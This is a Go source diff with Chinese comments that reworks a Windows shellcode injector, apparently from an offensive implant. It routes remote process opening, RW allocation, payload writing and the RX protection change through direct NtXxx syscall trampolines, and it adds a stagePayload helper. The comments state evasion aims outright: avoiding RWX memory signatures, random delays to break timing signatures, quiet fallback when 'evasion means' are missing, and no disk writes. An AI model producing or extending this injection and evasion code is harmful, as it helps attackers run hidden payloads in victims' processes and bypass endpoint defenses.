@@ -20,7 +20,8 @@ import (
 //   3. CreateRemoteThread —— 最后手段（显式 :crt 或自动回退）
 // 通用防护（沿用并强化）：
 //   - 最小权限句柄（无 PROCESS_ALL_ACCESS / THREAD_ALL_ACCESS）
-//   - 内存先 RW 写入，执行前 VirtualProtectEx 改 RX（消除 RWX 特征）
+//   - 内存先 RW 写入，执行前改 RX（消除 RWX 特征）；分配/写入/改保护在 syscall 模式下
+//     走 NtXxx trampoline，见 remotemem_windows.go
 //   - 写后校验写入字节数；失败输出 LastError 细节
 //   - 注入前随机延迟 0-3s（打破固定时序特征）
 // tech: auto(默认) | ntc | apc | crt
@@ -118,53 +119,30 @@ func InjectShellcode(shellcode []byte, pid int, tech string) ([]byte, error) {
 
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	ntdll := syscall.NewLazyDLL("ntdll.dll")
-	openProcess := kernel32.NewProc("OpenProcess")
-	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	closeHandle := kernel32.NewProc("CloseHandle")
 	getLastError := kernel32.NewProc("GetLastError")
 
 	const (
-		processCreateThread  = 0x0002
-		processQueryInfo     = 0x0400
-		processVMOperation   = 0x0008
-		processVMWrite       = 0x0020
-		processVMRead        = 0x0010
-		minProcessAccess     = processCreateThread | processQueryInfo | processVMOperation | processVMWrite | processVMRead
-		memCommit            = 0x1000
-		memReserve           = 0x2000
-		pageReadWrite        = 0x04 // 写入阶段：RW
-		pageExecuteRead      = 0x20 // 执行阶段：RX
+		processCreateThread = 0x0002
+		processQueryInfo    = 0x0400
+		processVMOperation  = 0x0008
+		processVMWrite      = 0x0020
+		processVMRead       = 0x0010
+		minProcessAccess    = processCreateThread | processQueryInfo | processVMOperation | processVMWrite | processVMRead
 	)
 
-	hProc, _, _ := openProcess.Call(uintptr(minProcessAccess), 0, uintptr(pid))
-	if hProc == 0 {
-		return nil, fmt.Errorf("OpenProcess 失败 (pid=%d)，请确认权限", pid)
+	// 打开/分配/写入/改保护统一走 remoteMemory：syscall 模式优先 NtXxx trampoline，
+	// 不可用时安静回退 kernel32（规避手段缺失不该让整条注入链失效）。
+	rm := newRemoteMemory()
+	hProc, err := rm.OpenProcess(pid, minProcessAccess)
+	if err != nil {
+		return nil, fmt.Errorf("打开目标进程失败 (pid=%d): %v", pid, err)
 	}
-	defer closeHandle.Call(hProc)
+	defer rm.Close(hProc)
 
-	// 1. 以 RW 分配并写入（无 RWX 特征）
-	addr, _, _ := virtualAllocEx.Call(hProc, 0, uintptr(len(shellcode)), memCommit|memReserve, pageReadWrite)
-	if addr == 0 {
-		return nil, fmt.Errorf("VirtualAllocEx 失败 (LastError=%d)", lastErrValue(getLastError))
-	}
-
-	var written uintptr
-	ret, _, _ := writeProcessMemory.Call(hProc, addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
-	if ret == 0 {
-		return nil, fmt.Errorf("WriteProcessMemory 失败 (LastError=%d)", lastErrValue(getLastError))
-	}
-	// 写后校验
-	if written != uintptr(len(shellcode)) {
-		return nil, fmt.Errorf("写入不完整: 期望 %d, 实际 %d", len(shellcode), written)
-	}
-
-	// 2. 执行前改为 RX（PAGE_EXECUTE_READ）
-	var oldProtect uint32
-	vprotRet, _, _ := virtualProtectEx.Call(hProc, addr, uintptr(len(shellcode)), pageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
-	if vprotRet == 0 {
-		return nil, fmt.Errorf("VirtualProtectEx 失败 (LastError=%d)", lastErrValue(getLastError))
+	addr, written, err := stagePayload(rm, hProc, shellcode)
+	if err != nil {
+		return nil, err
 	}
 
 	used := tech
@@ -202,7 +180,38 @@ func InjectShellcode(shellcode []byte, pid int, tech string) ([]byte, error) {
 		defer closeHandle.Call(thread)
 	}
 
-	return []byte(fmt.Sprintf("✅ 内存注入成功: pid=%d, technique=%s, 地址=%x, 长度=%d, 写入=%d（RW->RX，最小权限句柄，无落盘）", pid, used, addr, len(shellcode), written)), nil
+	return []byte(fmt.Sprintf("✅ 内存注入成功: pid=%d, technique=%s, 地址=%x, 长度=%d, 写入=%d（RW->RX，最小权限句柄，无落盘）\n后端=%s 调用序列=%s",
+		pid, used, addr, len(shellcode), written, rm.Backend(), strings.Join(rm.Trace(), " | "))), nil
+}
+
+// stagePayload 把 shellcode 落到目标进程：RW 分配 → 写入 → 校验 → 改 RX。
+//
+// 顺序不能换：
+//   - 先 RX 就写不进去；
+//   - 写完不改 RX 就在目标进程留一块可写可执行内存（RWX 是最刺眼的内存特征）；
+//   - 不校验写入字节数，会"报成功但只写进去一半"，症状是注入后进程无反应。
+//
+// 拆成独立函数是为了让"分配/写入/改保护的实际参数与顺序"能被单测钉住 ——
+// 这三步走错任何一步都没有编译期或运行期提示。
+func stagePayload(rm remoteMemory, h uintptr, shellcode []byte) (addr, written uintptr, err error) {
+	if len(shellcode) == 0 {
+		return 0, 0, fmt.Errorf("shellcode 为空")
+	}
+	addr, err = rm.Alloc(h, 0, uintptr(len(shellcode)), pageReadWrite)
+	if err != nil {
+		return 0, 0, fmt.Errorf("分配 payload 内存(RW)失败: %v", err)
+	}
+	written, err = rm.Write(h, addr, shellcode)
+	if err != nil {
+		return 0, 0, fmt.Errorf("写入 payload 失败: %v", err)
+	}
+	if written != uintptr(len(shellcode)) {
+		return 0, 0, fmt.Errorf("写入不完整: 期望 %d, 实际 %d", len(shellcode), written)
+	}
+	if _, err = rm.Protect(h, addr, uintptr(len(shellcode)), pageExecuteRead); err != nil {
+		return 0, 0, fmt.Errorf("payload 改为 RX 失败: %v", err)
+	}
+	return addr, written, nil
 }
 
 // injectNtCreateThreadEx NtCreateThreadEx 直接创建远程线程。
